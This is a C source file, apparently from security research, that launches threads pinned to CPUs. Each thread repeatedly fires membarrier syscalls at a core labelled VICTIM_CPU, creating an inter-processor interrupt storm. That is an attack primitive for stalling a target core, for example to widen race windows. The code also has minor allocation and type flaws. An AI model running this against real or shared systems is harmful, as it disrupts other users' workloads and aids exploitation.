#include "ipi.h"



int* thread_args;
int NUM_THREADS;
pthread_t* ipi_storm_threads;

inline static int
membarrier(int cmd, unsigned int flags, int cpu_id)
{
    return syscall(__NR_membarrier, cmd, flags, cpu_id);
}


void ipi_register(unsigned long num_threads)
{
     // Register the current process for private expedited commands
    int ret = membarrier(MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED_RSEQ, 0, 0);
    if (ret == -1) {
        printf("Failed to register for private expedited commands: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    // Call membarrier syscall with private expedited command
    ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, 0, 0);
    if (ret == -1) {
        printf("membarrier syscall failed with error code %d: %s\n", errno, strerror(errno));
        exit(EXIT_FAILURE);
    }
        
    /*
        Initialize arguments to IPI storm threads
    */
    NUM_THREADS = num_threads;
    thread_args = malloc(sizeof(int)*(NUM_THREADS));
    ipi_storm_threads = malloc(sizeof(pthread_t*)*(NUM_THREADS));
    for (int i = 2; i < NUM_THREADS+2; i++)
    {
        thread_args[i-2] = i;           // args will hold the CPU that thread will run on 
    }

}

void pin_cpu(int cpu)
{
    /*
        Pin thread to cpu
    */
    cpu_set_t mask;
    CPU_ZERO(&mask);    // Initialize CPU mask to all zeroes
    CPU_SET(cpu, &mask);  
    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }
}




void ipi_storm_thread(void *cpu)
{
   
    int cpu_num = *(int*)cpu;
    pin_cpu(cpu_num);
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
    while(1)
    {
        int ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, MEMBARRIER_CMD_FLAG_CPU, VICTIM_CPU);
    	if (ret < 0)
    	{
    		printf("membarrier syscall failed with error code %d\n", errno);
    		perror("membarrier()");
    	}
    }
}


void begin_ipi_storm()
{
    for (int i = 0; i < NUM_THREADS; i++)
    {
        pthread_create(&ipi_storm_threads[i], NULL, ipi_storm_thread, &thread_args[i]);
    }
}


int kill_ipi()
{
    int ret;
    for (int i = 0; i < NUM_THREADS; i++)
    {
        ret = pthread_cancel(ipi_storm_threads[i]);
    }
    return ret;
}